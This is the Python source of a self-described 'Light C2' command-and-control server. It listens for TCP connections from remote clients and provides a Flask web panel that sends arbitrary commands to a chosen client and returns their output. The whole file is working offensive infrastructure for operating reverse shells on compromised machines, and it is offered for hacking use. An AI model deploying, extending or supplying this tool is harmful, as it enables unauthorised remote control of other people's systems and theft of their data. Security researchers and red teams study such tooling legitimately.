import socket
import threading
import signal
import sys
import argparse
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)

clients = []
server_socket = None
server_shutdown = False

# Client class to store information about each connection
class ClientHandler:
    def __init__(self, client_socket, address):
        self.client_socket = client_socket
        self.address = address
        self.results = ""  # Store the result of the last executed command

    def send_command(self, command):
        try:
            self.client_socket.send(command.encode('utf-8'))
            if command.lower() == 'exit':
                return "Client disconnected."

            # Receive the result from the client
            result = self.client_socket.recv(4096).decode('utf-8')
            self.results = result
            return result
        except Exception as e:
            return f"Error sending command: {e}"
        
    @property
    def ip(self):
        return self.address[0] 

def handle_new_client(client_socket, address):
    client = ClientHandler(client_socket, address)
    clients.append(client)

def start_server(bind_ip, bind_port):
    global server_socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((bind_ip, bind_port))  
    server_socket.listen(5)
    print(f"[*] Listening on {bind_ip}:{bind_port}")

    while True:
        try:
            if server_shutdown:
                break
            client_socket, addr = server_socket.accept()
            client_handler = threading.Thread(target=handle_new_client, args=(client_socket, addr))
            client_handler.start()

        except OSError as e:
            if server_shutdown:
                print("[*] Server is shutting down, no longer accepting connections.")
                break
            print(f"[!] Error in server socket: {e}")
            break

@app.route('/')
def index():
    return render_template('index.html', clients=clients)

@app.route('/send_command/<int:client_id>', methods=['POST'])
def send_command(client_id):
    command = request.json.get('command')
    client = clients[client_id]
    result = client.send_command(command)
    return jsonify(result=result)


def close_connections():
    print("\n[*] Closing server connections...")
    for client in clients:
        try:
            client.client_socket.send(b'exit')
            client.client_socket.close()
        except Exception as e:
            print(f"[!] Error closing client {client.address}: {e}")
    print("[*] All connections closed.")

def close_server():
    print("\n[*] Closing server socket...")
    if server_socket:
        try:
            server_socket.close()
            print("[*] Server socket closed.")
        except Exception as e:
            print(f"[!] Error closing server socket: {e}")

def graceful_shutdown(signal, frame):
    global server_shutdown
    print("\n[*] Shutting down server gracefully...")
    server_shutdown = True
    close_connections()
    close_server()
    sys.exit(0)

# Set up signal handling for graceful shutdown (Ctrl+C)
signal.signal(signal.SIGINT, graceful_shutdown)

def parse_arguments():
    parser = argparse.ArgumentParser(description="Light C2 - Command & Control Center, Enjoy Hacking :)")
    parser.add_argument('-ip', type=str, required=True, help='IP address to bind the server to (required)')
    parser.add_argument('-p', type=int, required=True, help='Port to bind the server to (required)')
    return parser.parse_args()

if __name__ == "__main__":
    args = parse_arguments()
    threading.Thread(target=start_server, args=(args.ip, args.p)).start()
    app.run(debug=True, use_reloader=False, port=5000)
